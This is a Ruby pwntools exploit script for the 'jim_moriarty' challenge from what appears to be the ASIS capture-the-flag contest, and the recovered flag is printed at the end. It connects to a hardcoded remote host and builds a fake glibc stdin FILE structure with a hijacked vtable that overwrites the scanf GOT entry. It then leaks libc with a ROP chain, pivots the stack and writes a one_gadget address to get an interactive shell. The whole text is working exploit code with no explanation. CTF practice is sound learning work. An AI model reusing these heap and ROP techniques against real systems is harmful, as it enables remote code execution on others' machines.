#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/ruby-pwntools
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

@magic = one_gadget(file: './libc.so.6')[4]

host, port = '146.185.168.172', 54518
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'jim_moriarty'
def h;@h ||= heapinfo(@p); @h.reload!;end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================
context.arch = 'amd64' 
context.log_level = :debug

mmap_offset = 0x300000 - 0x10
libc = ELF.new('./libc.so.6')
z.puts mmap_offset + libc.symbols['_IO_2_1_stdin_'] + 56 # offsetof(_IO_buf_base)
z.puts 0x2ff000
# gets
z.recvuntil('shellcode')
# fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
file = flat('%13$s%9$[^Z]s'.ljust(16, "\x00"),1,2,3,4,5,6)
file = file.ljust(136, "\x00") + 0x601900.p64 # lock
file = file.ljust(192, "\x00") + p64(0)
file = file.ljust(216, "\x00") + (elf.got['__isoc99_scanf'] - 0x18).p64 # vtable
file = file.ljust(8192, 'A')
z.write(file)
# log.info (h.libc.base+libc.symbols['_IO_2_1_stdin_']).hex
sleep(0.5)
z.write(flat(0,0,0,0x601400, 0x601800,0,0,0,  0, elf.symbols['g_buf_ptr'] - 104))
sleep(0.5)
z.puts 'meow'
sleep(0.5)

pop_rbp = 0x0000000000400685
leave_ret = 0x0000000000400777

ret = 0x00000000004005ee

pop_rdi = 0x0000000000400923
plt_printf = 0x400600
rop = flat(ret, pop_rdi, elf.got.read.to_i, plt_printf, # leak
           pop_rdi, 0x601200, elf.symbols.read_n.to_i, # second stack
           pop_rbp, 0x601200-8, leave_ret # stack migration
          )
fail if rop.include?("Z")
z.puts 'A' * 7 + rop + 'Z'
z.recvuntil('? ')
libc.address = (z.recvuntil("\x7f")+"\x00\x00").u64 - libc.symbols.read
log.info('libc @ ' + libc.address.hex)

z.write p64(libc.address + @magic) # write 0x601200

z.interact
# ASIS{D1d_U_M133_M3_D1d_U_M133_M3?}
